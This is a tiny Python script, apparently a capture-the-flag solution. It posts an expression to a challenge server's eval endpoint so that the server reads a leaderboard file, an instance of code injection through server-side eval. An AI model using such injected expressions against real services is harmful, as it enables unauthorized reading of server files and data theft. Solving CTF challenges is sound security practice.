import requests

URL = "https://backcourts.ctf.csaw.io/get_eval"

command = "open(leaderboard_path, 'r').read()"

ans = requests.post(URL, json={"expr": command})
print(ans.text)